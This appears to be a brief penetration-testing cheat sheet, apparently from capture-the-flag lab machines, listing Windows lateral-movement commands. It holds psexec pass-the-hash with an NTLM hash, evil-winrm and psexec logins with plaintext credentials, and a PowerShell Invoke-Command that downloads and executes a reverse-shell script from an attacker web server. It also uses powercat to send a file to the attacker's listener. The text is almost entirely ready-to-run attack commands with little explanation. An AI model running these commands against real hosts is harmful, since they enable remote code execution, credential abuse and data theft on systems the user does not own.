```
psexec.py administrator@10.10.10.175 -hashes 'aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e'

psexec.py test.local/john:password123@10.10.10.1
```

evil-winrm

```
evil-winrm -i 10.10.11.168 -u 'MiscSvc' -p 'ScrambledEggs9900'
```

Use powershell to connect to another user

1. generate rev shell and save it to a file shell.ps1 and start the web server
2. 

```
$pass = ConvertTo-SecureString "ScrambledEggs9900" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("scrm\miscsvc", $pass)
Invoke-Command -Computer dc1 -ScriptBlock { IEX(New-Object Net.WebClient).downloadString("http://10.10.16.2/shell.ps1") } -Credential $cred
```


Tansfer file using powercat

```
Invoke-WebRequest -Uri "http://10.10.16.2/powercat.ps1" -OutFile powercat.ps1


Import-Module .\powercat.ps1
powercat -c 10.10.16.2 -p 1234 -i .\ScrambleClient.exe
```